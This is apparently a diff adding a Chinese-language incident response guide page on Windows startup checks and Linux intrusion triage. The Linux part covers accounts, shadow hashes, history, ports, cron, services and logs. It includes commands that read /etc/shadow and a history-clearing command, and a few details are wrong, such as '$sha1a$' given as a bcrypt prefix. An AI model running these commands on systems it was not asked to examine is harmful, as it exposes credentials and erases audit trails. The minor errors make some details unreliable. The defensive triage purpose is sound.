+注册表的作用：windows会把它的配置信息存储在注册表的数据库里，注册表就包含了计算机中每个用户的一些配置文件、系统的硬件信息、
+安装程序以及属性设置等等，windows在操作过程当中会不断的去引用这些信息。所以注册表也是攻击者喜欢攻击的一个目标。
+</p>
+
+<p>
+检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。
+</p></li>
+
+<li>利用安全软件查看启动项、开机时间管理等。</li>
+<li>组策略，运行 gpedit.msc
+<ul class="org-ul">
+<li><p>
+计算机配置中找到 Windows 设置，在"脚本(启动/关机)"中双击查看启动配置是否有可疑脚本
+</p>
+
+<p>
+组策略的作用：它提供了操作系统、应用程序以及一些活动目录当中用户设置的集中化的管理和配置，可以控制用户账户以及计算机账户的一些工作环境。
+</p></li>
+</ul></li>
+</ol>
+
+
+<figure id="org182e4c3">
+<img style="aspect-ratio:1630/792" decoding="async" loading="lazy" src="./images/img_20230814_141546.webp" alt="img_20230814_141546.webp" width="50%">
+
+</figure>
+</div>
+</div>
+</div>
+<div id="outline-container-h:44523998-1c58-49c0-9428-26688ff69212" class="outline-3">
+<h3 id="h:44523998-1c58-49c0-9428-26688ff69212"><a href="#h:44523998-1c58-49c0-9428-26688ff69212">Linux入侵排查</a></h3>
+<div class="outline-text-3" id="text-h:44523998-1c58-49c0-9428-26688ff69212">
+<p>
+入侵排查比较依赖于对系统命令的掌握程度。
+</p>
+
+<p>
+<b>使用环境：CentOS</b>
+</p>
+
+<p>
+针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，常见 Linux 服务器入侵排查的思路如下。
+</p>
+</div>
+<div id="outline-container-h:ac41c858-0a1f-4308-8234-d005472fd39e" class="outline-4">
+<h4 id="h:ac41c858-0a1f-4308-8234-d005472fd39e"><a href="#h:ac41c858-0a1f-4308-8234-d005472fd39e">账号安全</a></h4>
+<div class="outline-text-4" id="text-h:ac41c858-0a1f-4308-8234-d005472fd39e">
+<p>
+<b>基本使用</b>
+</p>
+
+<p>
+1、用户信息文件/etc/passwd
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">root:x:0:0:root:/root:/bin/bash
+
+account:password:UID:GID:GECOS:directory:shell
+&#29992;&#25143;&#21517;&#65306;&#23494;&#30721;&#65306;&#29992;&#25143;ID&#65306;&#32452;ID&#65306;&#29992;&#25143;&#35828;&#26126;&#65306;&#23478;&#30446;&#24405;&#65306;&#30331;&#38470;&#20043;&#21518;&#30340;shell &#27880;&#24847;&#65306;&#26080;&#23494;&#30721;&#21482;&#20801;&#35768;&#26412;&#26426;&#30331;&#38470;&#65292;&#36828;&#31243;&#19981;&#20801;&#35768;&#30331;&#38470;
+</pre>
+</div>
+
+<p>
+2、影子文件 /etc/shadow
+</p>
+
+<p>
+文档参考
+</p>
+<ul class="org-ul">
+<li><a href="https://manpages.ubuntu.com/manpages/questing/en/man5/shadow.5.html">shadow(5)</a></li>
+<li><a href="https://manpages.ubuntu.com/manpages/questing/en/man5/crypt.5.html">crypt(5)</a> 密码构成</li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-sh">username:password:last_change:min_change:max_change:warm:failed_expire:expiration:reserved
+<span class="org-function-name">&#26684;&#24335;</span>(&#20061;&#27573;):&#29992;&#25143;&#21517;:&#21152;&#23494;&#30340;&#23494;&#30721;:&#26368;&#36817;&#19968;&#27425;&#20462;&#25913;&#23494;&#30721;&#30340;&#26102;&#38388;:&#26368;&#30701;&#20351;&#29992;&#26399;&#38480;:&#26368;&#38271;&#20351;&#29992;&#26399;&#38480;:&#35686;&#21578;&#26399;&#27573;:&#23494;&#30721;&#31105;&#29992;&#26399;:&#36807;&#26399;&#26399;&#38480;:&#20445;&#30041;&#23383;&#27573; 
+
+root:$<span class="org-variable-name">1</span>$<span class="org-variable-name">HDHf2v4i</span>$<span class="org-variable-name">LMo</span>.xGHfxQDOf8e043C.g/:16779:0:99999:7:::
+jasper:$<span class="org-variable-name">y</span>$<span class="org-variable-name">j9T</span>$<span class="org-variable-name">yLnadhKD4TsirYRzUbhe1</span>.$<span class="org-variable-name">bIlBO3iWembE4sAm4LeIwk0QylqrSQCmYaEbeIyKV3</span>.:19964:0:99999:7:::
+bin:*:19964:0:99999:7:::
+tss:!:19964::::::
+tss:!!:19964::::::
+
+
+username       <span class="org-comment-delimiter"># </span><span class="org-comment">&#30331;&#24405;&#29992;&#21517;
+</span>password       <span class="org-comment-delimiter"># </span><span class="org-comment">&#21152;&#23494;&#30340;&#23494;&#30721;&#12290;&#19968;&#33324;&#29992;sha512&#21152;&#23494;
+</span>last_change    <span class="org-comment-delimiter"># </span><span class="org-comment">&#26368;&#36817;&#19968;&#27425;&#20462;&#25913;&#23494;&#30721;&#30340;&#26102;&#38388;&#12290;&#20174;1970&#24180;1&#26376;1&#26085;(Unix&#20803;&#24180;)&#36215;&#21040;&#23494;&#30721;&#26368;&#36817;&#19968;&#27425;&#34987;&#26356;&#25913;&#30340;&#22825;&#25968;
+</span>
+  &#22914;16779&#65292;&#34920;&#31034;&#20043;&#21518;&#31532;16779&#22825;&#65292;&#20351;&#29992; date -d <span class="org-string">'1970-01-01 16779 days'</span> &#26597;&#30475;&#24403;&#22825;&#20462;&#25913;&#30340;&#26085;&#26399;
+
+min_change     <span class="org-comment-delimiter"># </span><span class="org-comment">&#26368;&#30701;&#20351;&#29992;&#26399;&#38480;&#12290;&#23494;&#30721;&#20877;&#36807;&#20960;&#22825;&#21487;&#20197;&#34987;&#21464;&#26356;&#65288;0&#34920;&#31034;&#38543;&#26102;&#21487;&#34987;&#21464;&#26356;&#65289;
+</span>max_change     <span class="org-comment-delimiter"># </span><span class="org-comment">&#26368;&#38271;&#20351;&#29992;&#26399;&#38480;&#12290;&#23494;&#30721;&#20877;&#36807;&#20960;&#22825;&#24517;&#39035;&#34987;&#21464;&#26356;&#65288;99999&#34920;&#31034;&#27704;&#19981;&#36807;&#26399;&#65289;
+</span>warm           <span class="org-comment-delimiter"># </span><span class="org-comment">&#35686;&#21578;&#26399;&#27573;&#12290;&#23494;&#30721;&#36807;&#26399;&#21069;&#20960;&#22825;&#31995;&#32479;&#25552;&#37266;&#29992;&#25143;&#65288;&#40664;&#35748;&#20026;&#19968;&#21608;&#65289;
+</span>failed_expire  <span class="org-comment-delimiter"># </span><span class="org-comment">&#23494;&#30721;&#31105;&#29992;&#26399;&#12290;&#23494;&#30721;&#36807;&#26399;&#20960;&#22825;&#21518;&#24080;&#21495;&#20250;&#34987;&#38145;&#23450;
+</span>expiration     <span class="org-comment-delimiter"># </span><span class="org-comment">&#36807;&#26399;&#26399;&#38480;&#12290;&#20174;1970&#24180;1&#26376;1&#26085;&#31639;&#36215;&#65292;&#22810;&#23569;&#22825;&#21518;&#24080;&#21495;&#22833;&#25928;&#12290;
+</span>   
+  &#19981;&#21516;&#20110;&#23494;&#30721;&#36807;&#26399;&#65307;&#36134;&#25143;&#36807;&#26399;&#26102;&#65292;&#29992;&#25143;&#23558;&#19981;&#34987;&#20801;&#35768;&#30331;&#24405;&#65307;&#23494;&#30721;&#36807;&#26399;&#26102;&#65292;&#29992;&#25143;&#23558;&#19981;&#34987;&#20801;&#35768;&#20351;&#29992;&#20854;&#23494;&#30721;&#30331;&#24405;&#12290;
+   
+reserved       <span class="org-comment-delimiter"># </span><span class="org-comment">&#20445;&#30041;&#23383;&#27573;</span>
+</pre>
+</div>
+
+<p>
+用户密码段说明：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">&#29305;&#27530;&#20540;:
+</span>* (&#26143;&#21495;)       <span class="org-comment-delimiter">#</span><span class="org-comment">&#34920;&#31034;&#35813;&#36134;&#25143;&#34987;&#31105;&#29992;&#65288;&#36890;&#24120;&#29992;&#20110;&#31995;&#32479;&#26381;&#21153;&#36134;&#25143;&#65292;&#31105;&#27490;&#30331;&#24405;&#65289;&#12290;&#23494;&#30721;&#30331;&#24405;&#26080;&#25928;&#65292;&#20294;&#20854;&#20182;&#26041;&#24335;&#65288;&#22914; SSH &#23494;&#38053;&#65289;&#21487;&#33021;&#20801;&#35768;&#12290;
+</span><span class="org-negation-char">!</span> (&#21497;&#21495;)       <span class="org-comment-delimiter">#</span><span class="org-comment">&#20063;&#34920;&#31034;&#36134;&#25143;&#34987;&#38145;&#23450;&#25110;&#23494;&#30721;&#34987;&#31105;&#29992;&#12290;&#25928;&#26524;&#31867;&#20284; *&#12290;
+</span><span class="org-negation-char">!</span>! (&#20004;&#20010;&#21497;&#21495;)  <span class="org-comment-delimiter">#</span><span class="org-comment">&#34920;&#31034;&#20174;&#26410;&#35774;&#32622;&#36807;&#23494;&#30721;&#65288;&#24120;&#35265;&#20110;&#26032;&#21019;&#24314;&#20294;&#23578;&#26410;&#35774;&#32622;&#23494;&#30721;&#30340;&#36134;&#25143;&#65289;&#12290;&#23494;&#30721;&#30331;&#24405;&#26080;&#25928;&#12290;
+</span>&#31354;             <span class="org-comment-delimiter">#</span><span class="org-comment">&#26497;&#20854;&#21361;&#38505;&#65281;&#34920;&#31034;&#35813;&#36134;&#25143;&#27809;&#26377;&#23494;&#30721;&#12290;&#20219;&#20309;&#30693;&#36947;&#29992;&#25143;&#21517;&#30340;&#20154;&#37117;&#21487;&#20197;&#30452;&#25509;&#30331;&#24405;&#12290;&#24212;&#32477;&#23545;&#36991;&#20813;&#12290;
+</span>
+
+&#26684;&#24335;: 
+$<span class="org-variable-name">id</span>$<span class="org-variable-name">salt</span>$<span class="org-variable-name">hashed</span>
+
+&#20197;$<span class="org-variable-name">&#20998;&#38548;</span>&#65292;$<span class="org-variable-name">&#25968;&#23383;</span>$<span class="org-variable-name">&#38543;&#26426;&#25968;</span>$<span class="org-variable-name">&#21152;&#23494;&#21518;&#30340;&#23494;&#30721;&#20018;</span>&#65307;&#31532;3&#20010; $ &#20998;&#38548;&#30340;&#25165;&#26159;&#30495;&#27491;&#30340;&#23494;&#30721;&#20018;&#65307;
+
+$<span class="org-variable-name">id</span>$  <span class="org-comment-delimiter"># </span><span class="org-comment">&#26631;&#35782;&#20351;&#29992;&#30340;&#21152;&#23494;&#31639;&#27861;&#12290;&#24120;&#35265;&#30340;&#26377;&#65306;
+</span>- $<span class="org-variable-name">1</span>$        <span class="org-comment-delimiter"># </span><span class="org-comment">MD5 (&#24050;&#36807;&#26102;&#65292;&#19981;&#23433;&#20840;)
+</span>- $<span class="org-variable-name">sha1a</span>$, $<span class="org-variable-name">2</span>b$, $<span class="org-variable-name">2</span>y$ <span class="org-comment-delimiter"># </span><span class="org-comment">Blowfish / bcrypt
+</span>- $<span class="org-variable-name">5</span>$        <span class="org-comment-delimiter"># </span><span class="org-comment">SHA-256
+</span>- $<span class="org-variable-name">6</span>$        <span class="org-comment-delimiter"># </span><span class="org-comment">SHA-512
+</span>- $<span class="org-variable-name">y</span>$, $<span class="org-variable-name">gy</span>$  <span class="org-comment-delimiter"># </span><span class="org-comment">Yescrypt &#24403;&#21069;&#25512;&#33616;&#12290;&#36739;&#26032;&#65292;&#26356;&#24378;&#65292;&#25269;&#24481;&#23494;&#30721;&#29468;&#27979;&#25915;&#20987;)
+</span>
+$<span class="org-variable-name">salt</span>$  <span class="org-comment-delimiter"># </span><span class="org-comment">&#19968;&#20010;&#38543;&#26426;&#29983;&#25104;&#30340;&#23383;&#31526;&#20018;&#65288;&#36890;&#24120; 8-16 &#23383;&#31526;&#65289;&#65292;&#29992;&#20110;&#22686;&#21152;&#23494;&#30721;&#21704;&#24076;&#30340;&#22797;&#26434;&#24615;&#65292;&#38450;&#27490;&#24425;&#34425;&#34920;&#25915;&#20987;&#12290;
+</span>
+$<span class="org-variable-name">hashed</span> <span class="org-comment-delimiter"># </span><span class="org-comment">&#23558;&#29992;&#25143;&#36755;&#20837;&#30340;&#23494;&#30721;&#19982;&#30416;&#20540;&#32467;&#21512;&#21518;&#65292;&#36890;&#36807;&#25351;&#23450;&#31639;&#27861;&#35745;&#31639;&#20986;&#30340;&#21152;&#23494;&#21704;&#24076;&#20540;&#12290;</span>
+</pre>
+</div>
+
+<p>
+范例:天数转换
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"> &gt;_ tail -2 /etc/shadow
+jasper:$<span class="org-variable-name">y</span>$<span class="org-variable-name">j9T</span>$<span class="org-variable-name">yLnadhKD4TsirYRzUbhe1</span>.$<span class="org-variable-name">bIlBO3iWembE4sAm4LeIwk0QylqrSQCmYaEbeIyKV3</span>.:19964:0:99999:7:::
+
+date -d <span class="org-string">"1970-01-01 + 19964 days"</span> +<span class="org-string">"%Y-%m-%d"</span>
+awk -F: <span class="org-string">'$1=="jasper"{print $3}'</span> /etc/shadow | xargs -I {} date -d <span class="org-string">"1970-01-01 + {} days"</span> +<span class="org-string">"%Y-%m-%d"</span>
+chage -l jasper | grep <span class="org-string">"Last password change"</span>
+</pre>
+</div>
+
+
+<div class="org-src-container">
+<pre class="src src-sh">who &#26597;&#30475;&#24403;&#21069;&#30331;&#24405;&#29992;&#25143;&#65288;tty &#26412;&#22320;&#30331;&#38470; pts &#36828;&#31243;&#30331;&#24405;&#65289;
+
+w &#26597;&#30475;&#31995;&#32479;&#20449;&#24687;&#65292;&#24819;&#30693;&#36947;&#26576;&#19968;&#26102;&#21051;&#29992;&#25143;&#30340;&#34892;&#20026;
+
+uptime &#26597;&#30475;&#30331;&#38470;&#22810;&#20037;&#12289;&#22810;&#23569;&#29992;&#25143;&#65292;&#36127;&#36733;&#29366;&#24577;
+</pre>
+</div>
+
+<p>
+<b>入侵排查</b>
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">1&#65289;&#26597;&#35810;&#29305;&#26435;&#29992;&#25143;(uid&#20026;0)
+awk -F: <span class="org-string">'$3==0{print $1}'</span> /etc/passwd
+
+2&#65289;&#26597;&#35810;&#21487;&#20197;&#36828;&#31243;&#30331;&#24405;&#30340;&#36134;&#21495;&#20449;&#24687;
+awk <span class="org-string">'/\$1|\$6/{print $1}'</span> /etc/shadow
+
+3&#65289;&#38500;root&#36134;&#21495;&#22806;&#65292;&#20854;&#20182;&#36134;&#21495;&#26159;&#21542;&#23384;&#22312;sudo&#26435;&#38480;&#12290;&#22914;&#38750;&#31649;&#29702;&#38656;&#35201;&#65292;&#26222;&#36890;&#36134;&#21495;&#24212;&#21024;&#38500;sudo&#26435;&#38480;
+more /etc/sudoers | grep -v <span class="org-string">"^#\|^$"</span> | grep <span class="org-string">"ALL=(ALL)"</span>
+
+4&#65289;&#31105;&#29992;&#25110;&#21024;&#38500;&#22810;&#20313;&#21450;&#21487;&#30097;&#30340;&#36134;&#21495;
+usermod -L user &#31105;&#29992;&#36134;&#21495;&#65292;&#36134;&#21495;&#26080;&#27861;&#30331;&#24405;&#65292;/etc/shadow &#31532;&#20108;&#26639;&#20026; ! &#24320;&#22836;
+userdel user &#21024;&#38500; user &#29992;&#25143;
+userdel -r user &#23558;&#21024;&#38500; user &#29992;&#25143;&#65292;&#24182;&#19988;&#23558; /home &#30446;&#24405;&#19979;&#30340; user &#30446;&#24405;&#19968;&#24182;&#21024;&#38500;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:6e8d634e-1453-4cd3-92b7-fdd8dfcff9c0" class="outline-4">
+<h4 id="h:6e8d634e-1453-4cd3-92b7-fdd8dfcff9c0"><a href="#h:6e8d634e-1453-4cd3-92b7-fdd8dfcff9c0">历史命令</a></h4>
+<div class="outline-text-4" id="text-h:6e8d634e-1453-4cd3-92b7-fdd8dfcff9c0">
+<p>
+<b>基本使用</b>
+</p>
+
+<p>
+通过 .bash_history 文件查看账号执行过的系统命令
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">1&#12289;root&#29992;&#25143;&#30340;&#21382;&#21490;&#21629;&#20196;
+histroy
+
+2&#12289;&#25171;&#24320; /home &#21508;&#36134;&#21495;&#30446;&#24405;&#19979;&#30340; .bash_history&#65292;&#26597;&#30475;&#26222;&#36890;&#36134;&#21495;&#25191;&#34892;&#30340;&#21382;&#21490;&#21629;&#20196;&#12290;
+
+3&#12289;&#21382;&#21490;&#25805;&#20316;&#21629;&#20196;&#30340;&#28165;&#38500;&#65306;history -c
+&#20294;&#27492;&#21629;&#20196;&#24182;&#19981;&#20250;&#28165;&#38500;&#20445;&#23384;&#22312;&#25991;&#20214;&#20013;&#30340;&#35760;&#24405;&#65292;&#22240;&#27492;&#38656;&#35201;&#25163;&#21160;&#21024;&#38500; .bash_profile &#25991;&#20214;&#20013;&#30340;&#35760;&#24405;&#12290;
+</pre>
+</div>
+
+<p>
+<b>入侵排查</b>
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&#36827;&#20837;&#29992;&#25143;&#30446;&#24405;&#19979;&#65292;&#23548;&#20986;&#21382;&#21490;&#21629;&#20196;
+cat .bash_history &gt;&gt; history.txt
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:9fb560c0-8826-4fa6-b694-6e6670b17165" class="outline-4">
+<h4 id="h:9fb560c0-8826-4fa6-b694-6e6670b17165"><a href="#h:9fb560c0-8826-4fa6-b694-6e6670b17165">检查异常端口</a></h4>
+<div class="outline-text-4" id="text-h:9fb560c0-8826-4fa6-b694-6e6670b17165">
+<p>
+使用 netstat 网络连接命令，分析可疑端口、IP、PID
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">netstat -antlp
+
+&#26597;&#30475; pid &#25152;&#23545;&#24212;&#30340;&#36827;&#31243;&#25991;&#20214;&#36335;&#24452;:
+&#36816;&#34892; ls -l /proc/$<span class="org-variable-name">PID</span>/exe &#25110; file /proc/$<span class="org-variable-name">PID</span>/exe&#65288;$<span class="org-variable-name">PID</span> &#20026;&#23545;&#24212;&#30340; pid &#21495;&#65289;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:d329003d-c06e-4b34-bfc3-5a0d70c88f92" class="outline-4">
+<h4 id="h:d329003d-c06e-4b34-bfc3-5a0d70c88f92"><a href="#h:d329003d-c06e-4b34-bfc3-5a0d70c88f92">检查异常进程</a></h4>
+<div class="outline-text-4" id="text-h:d329003d-c06e-4b34-bfc3-5a0d70c88f92">
+<p>
+使用 ps 命令，分析进程
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">ps aux | grep pid
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:ac57c193-f535-4878-9aa4-45de3d31cb19" class="outline-4">
+<h4 id="h:ac57c193-f535-4878-9aa4-45de3d31cb19"><a href="#h:ac57c193-f535-4878-9aa4-45de3d31cb19">检查开机启动项</a></h4>
+<div class="outline-text-4" id="text-h:ac57c193-f535-4878-9aa4-45de3d31cb19">
+<p>
+<b>基本使用</b>
+</p>
+
+<p>
+Linux系统有7个系统运行级别（runlevel）:
+</p>
+<ul class="org-ul">
+<li>运行级别0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动</li>
+<li>运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登陆</li>
+<li>运行级别2：多用户状态(没有NFS)</li>
+<li>运行级别3：完全的多用户状态(有NFS)，登陆后进入控制台命令行模式</li>
+<li>运行级别4：系统未使用，保留</li>
+<li>运行级别5：X11控制台，登陆后进入图形GUI模式</li>
+<li>运行级别6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动</li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#36816;&#34892;&#32423;&#21035; &#21547;&#20041;
+0 &#20851;&#26426;
+1 &#21333;&#29992;&#25143;&#27169;&#24335;&#65292;&#21487;&#20197;&#24819;&#35937;&#20026;windows&#30340;&#23433;&#20840;&#27169;&#24335;&#65292;&#20027;&#35201;&#29992;&#20110;&#31995;&#32479;&#20462;&#22797;
+2 &#19981;&#23436;&#20840;&#30340;&#21629;&#20196;&#34892;&#27169;&#24335;&#65292;&#19981;&#21547;NFS&#26381;&#21153;
+3 &#23436;&#20840;&#30340;&#21629;&#20196;&#34892;&#27169;&#24335;&#65292;&#23601;&#26159;&#26631;&#20934;&#23383;&#31526;&#30028;&#38754;
+4 &#31995;&#32479;&#20445;&#30041;
+5 &#22270;&#24418;&#27169;&#24335;
+6 &#37325;&#21551;&#21160;
+</pre>
+</div>
+
+<p>
+查看运行级别命令: <code>runlevel</code>
+</p>
+
+<p>
+开机启动配置文件: /etc/rc.d/rc.local /etc/rc.d/rc[0~6].d
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">&#21015;&#20986;&#24320;&#26426;&#21551;&#21160;&#26381;&#21153;
+</span>systemctl list-unit-files --type=service | grep enabled
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">chkconfig &#21629;&#20196;&#29992;&#20110;&#26816;&#26597;&#65292;&#35774;&#32622;&#31995;&#32479;&#30340;&#21508;&#31181;&#26381;&#21153;
+</span>chkconfig --list [name] <span class="org-comment-delimiter"># </span><span class="org-comment">&#26381;&#21153;&#21015;&#34920;[&#21487;&#26681;&#25454;&#23454;&#38469;&#38656;&#35201;&#65292;&#20572;&#25481;&#19981;&#29992;&#26381;&#21153;]
+</span>chkconfig --add [name]  <span class="org-comment-delimiter"># </span><span class="org-comment">&#26381;&#21153;&#28155;&#21152;[&#22914;&#32570;&#30465;&#65292;&#21017;&#20174;&#32570;&#30465;&#30340;init&#33050;&#26412;&#33258;&#21160;&#24314;&#31435;]
+</span>chkconfig --del [name]  <span class="org-comment-delimiter"># </span><span class="org-comment">&#26381;&#21153;&#21024;&#38500;[&#24182;&#25226;&#30456;&#20851;&#31526;&#21495;&#36830;&#25509;&#20174;/etc/rc[0-6].d&#21024;&#38500;]</span>
+</pre>
+</div>
+
+<p>
+当我们需要设置开机启动的脚本时，只需要将可执行脚本放在 /etc/init.d 目录下，然后在/etc/rc.d/rc*.d 目录下建立软链接即可。
+</p>
+
+<p>
+注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级
+</p>
+
+<p>
+<b>入侵排查</b>
+</p>
+
+<p>
+启动项文件：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">/etc/rc.d/rc.local
+/etc/rc.d/rc[0~6].d
+
+ls -l /etc/rc.d/rc3.d/
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:b79334bf-218d-402c-8ec9-6ed0cfd09b4d" class="outline-4">
+<h4 id="h:b79334bf-218d-402c-8ec9-6ed0cfd09b4d"><a href="#h:b79334bf-218d-402c-8ec9-6ed0cfd09b4d">检查定时任务</a></h4>
+<div class="outline-text-4" id="text-h:b79334bf-218d-402c-8ec9-6ed0cfd09b4d">
+<p>
+<b>基本使用</b>
+</p>
+
+<p>
+1、利用 crontab 创建计划任务
+基本命令
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">crontab -l &#21015;&#20986;&#26576;&#20010;&#29992;&#25143;cron&#26381;&#21153;&#30340;&#35814;&#32454;&#20869;&#23481;
+Tips&#65306;&#40664;&#35748;&#32534;&#20889;&#30340;crontab&#25991;&#20214;&#20250;&#20445;&#23384;&#22312; /var/spool/cron/&#29992;&#25143;&#21517; &#20363;&#22914;: /var/spool/cron/root
+
+crontab -r &#21024;&#38500;&#27599;&#20010;&#29992;&#25143;cron&#20219;&#21153;(&#35880;&#24910;&#65306;&#21024;&#38500;&#25152;&#26377;&#30340;&#35745;&#21010;&#20219;&#21153;)
+
+crontab -e &#20351;&#29992;&#32534;&#36753;&#22120;&#32534;&#36753;&#24403;&#21069;&#30340;crontab&#25991;&#20214; &#22914;&#65306;
+*/1 * * * * echo <span class="org-string">"hello world"</span> &gt;&gt; /tmp/test.txt <span class="org-comment-delimiter">#</span><span class="org-comment">&#27599;&#20998;&#38047;&#20889;&#20837;&#25991;&#20214;
+</span><span class="org-comment-delimiter">#</span><span class="org-comment">&#26143;&#21495;&#20195;&#34920;&#20998;&#26102;&#26085;&#26376;&#21608;</span>
+</pre>
+</div>
+
+<p>
+2、利用 anacron 命令实现异步定时任务调度
+</p>
+
+<p>
+<b>入侵排查</b>
+重点关注以下目录中是否存在恶意脚本
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">/var/spool/cron/*
+/etc/crontab
+/etc/cron.d/*
+/etc/cron.daily/*
+/etc/cron.hourly/*
+/etc/cron.monthly/*
+/etc/cron.weekly/
+/etc/anacrontab
+/var/spool/anacron/*
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:5b46fbde-efda-408e-96e6-fc4b5ecaa174" class="outline-4">
+<h4 id="h:5b46fbde-efda-408e-96e6-fc4b5ecaa174"><a href="#h:5b46fbde-efda-408e-96e6-fc4b5ecaa174">检查服务</a></h4>
+<div class="outline-text-4" id="text-h:5b46fbde-efda-408e-96e6-fc4b5ecaa174">
+<p>
+<b>服务自启动</b>
+</p>
+
+<p>
+第一种修改方法：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">chkconfig [--level &#36816;&#34892;&#32423;&#21035;] [&#29420;&#31435;&#26381;&#21153;&#21517;] [on|off]
+chkconfig &#8211;-level 2345 httpd on &#24320;&#21551;&#33258;&#21551;&#21160;
+chkconfig httpd on &#65288;&#40664;&#35748;level&#26159;2345&#65289;
+</pre>
+</div>
+
+<p>
+第二种修改方法：
+</p>
+<ul class="org-ul">
+<li>修改 /etc/rc.d/rc.local 文件，加入 /etc/init.d/httpd start</li>
+</ul>
+
+<p>
+<b>入侵排查</b>
+</p>
+
+<p>
+查询已安装的服务：
+</p>
+
+<p>
+RPM包安装的服务
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">chkconfig --list &#26597;&#30475;&#26381;&#21153;&#33258;&#21551;&#21160;&#29366;&#24577;&#65292;&#21487;&#20197;&#30475;&#21040;&#25152;&#26377;&#30340;RPM&#21253;&#23433;&#35013;&#30340;&#26381;&#21153;
+ps aux | grep crond &#26597;&#30475;&#24403;&#21069;&#26381;&#21153;
+
+&#26597;&#30475;&#31995;&#32479;&#22312;3&#19982;5&#32423;&#21035;&#19979;&#30340;&#21551;&#21160;&#39033;
+&#20013;&#25991;&#29615;&#22659;
+chkconfig --list | grep <span class="org-string">"3:&#21551;&#29992;\|5:&#21551;&#29992;"</span>
+&#33521;&#25991;&#29615;&#22659;
+chkconfig --list | grep <span class="org-string">"3:on\|5:on"</span>
+</pre>
+</div>
+
+<p>
+源码包安装的服务
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&#28304;&#30721;&#21253;&#26381;&#21153;&#30340;&#21551;&#21160;&#31649;&#29702;&#65306;/usr/local/
+&#28304;&#30721;&#21253;&#26381;&#21153;&#30340;&#33258;&#21551;&#21160;&#31649;&#29702;&#65306;/etc/rc.d/init.d/
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:aad1612a-570d-4784-ae87-e9a897040b0c" class="outline-4">
+<h4 id="h:aad1612a-570d-4784-ae87-e9a897040b0c"><a href="#h:aad1612a-570d-4784-ae87-e9a897040b0c">检查异常文件</a></h4>
+<div class="outline-text-4" id="text-h:aad1612a-570d-4784-ae87-e9a897040b0c">
+<p>
+1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">. &#28857;&#21253;&#21547;&#38544;&#34255;&#25991;&#20214;&#65292; *&#19981;&#21253;&#21547;&#38544;&#34255;&#25991;&#20214;
+</span>ls . <span class="org-comment-delimiter">#</span><span class="org-comment">&#25152;</span>
+</pre>
+</div>
+
+<p>
+2、针对可疑文件可以使用 stat 查看创建修改时间。
+</p>
+</div>
+</div>
+<div id="outline-container-h:7a6ff2be-e8c2-4f04-be72-45b597199d35" class="outline-4">
+<h4 id="h:7a6ff2be-e8c2-4f04-be72-45b597199d35"><a href="#h:7a6ff2be-e8c2-4f04-be72-45b597199d35">检查系统日志</a></h4>
+<div class="outline-text-4" id="text-h:7a6ff2be-e8c2-4f04-be72-45b597199d35">
+<p>
+日志默认存放位置：/var/log/
+</p>
+
+<p>
+查看日志配置情况：more /etc/rsyslog.conf
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#26085;&#24535;&#25991;&#20214; &#35828;&#26126;
+/var/log/cron &#35760;&#24405;&#20102;&#31995;&#32479;&#23450;&#26102;&#20219;&#21153;&#30456;&#20851;&#30340;&#26085;&#24535;
+
+/var/log/cups &#35760;&#24405;&#25171;&#21360;&#20449;&#24687;&#30340;&#26085;&#24535;
+
+/var/log/dmesg &#35760;&#24405;&#20102;&#31995;&#32479;&#22312;&#24320;&#26426;&#26102;&#20869;&#26680;&#33258;&#26816;&#30340;&#20449;&#24687;&#65292;&#20063;&#21487;&#20197;&#20351;&#29992;dmesg&#21629;&#20196;&#30452;&#25509;&#26597;&#30475;&#20869;&#26680;&#33258;&#26816;&#20449;&#24687;
+
+/var/log/mailog &#35760;&#24405;&#37038;&#20214;&#20449;&#24687;
+
+/var/log/message &#35760;&#24405;&#31995;&#32479;&#37325;&#35201;&#20449;&#24687;&#30340;&#26085;&#24535;&#12290;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;&#20013;&#20250;&#35760;&#24405;Linux&#31995;&#32479;&#30340;&#32477;&#22823;&#22810;&#25968;&#37325;&#35201;&#20449;&#24687;&#65292;&#22914;&#26524;&#31995;&#32479;&#20986;&#29616;&#38382;&#39064;&#26102;&#65292;&#39318;&#20808;&#35201;&#26816;&#26597;&#30340;&#23601;&#24212;&#35813;&#26159;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;
+
